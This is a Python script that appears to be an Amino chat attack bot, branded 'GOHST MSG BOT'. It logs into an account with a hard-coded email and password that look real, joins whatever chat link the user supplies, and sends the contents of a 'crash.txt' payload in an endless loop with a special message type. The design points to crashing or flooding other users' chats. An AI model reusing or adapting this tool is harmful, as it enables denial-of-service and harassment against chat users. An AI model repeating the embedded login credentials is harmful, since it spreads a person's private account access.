import os
import aminofix as amino
from concurrent.futures import ThreadPoolExecutor
import pyfiglet
from os import path
try:
    import colorama
except ModuleNotFoundError:
    os.system("pip install colorama")
    import colorama
try:
    import pyfiglet
except ModuleNotFoundError:
    os.system("pip install pyfiglet")
    import pyfiglet
from colorama import init, Fore, Back, Style
init()
print(colorama.Fore.CYAN)
print(colorama.Style.BRIGHT)
f = pyfiglet.Figlet(font='slant')
print (f.renderText('GOHST'))
f = pyfiglet.Figlet(font='slant')
print (f.renderText('MSG'))
print("\t\033[1;31m Uzair_hacked\n\n")
print("\t\033[1;31m Insta id :- wtf_uzair_69\n\n")
print("\t\033[1;32m /GOHST/ MSG\033[1;36mBOT  \n\n")

client=amino.Client()
client.login(email="sumeetsingh068@gmail.com",password="@Soul2413")

print("\nLogged in...")
n=input("\nChat link : ")

fok=client.get_from_code(n)
id=client.get_from_code(n).objectId
cid=fok.path[1:fok.path.index("/")]
p=open("crash.txt").read()
print(cid)
client.join_community(comId=cid)
subclient=amino.SubClient(comId=cid, profile=client.profile)
print("\nJoined Community...")
subclient.join_chat(chatId=id)
while True:
    subclient.send_message(chatId=id,     message=p,messageType=109)
    print("\nMessage send succesfully...")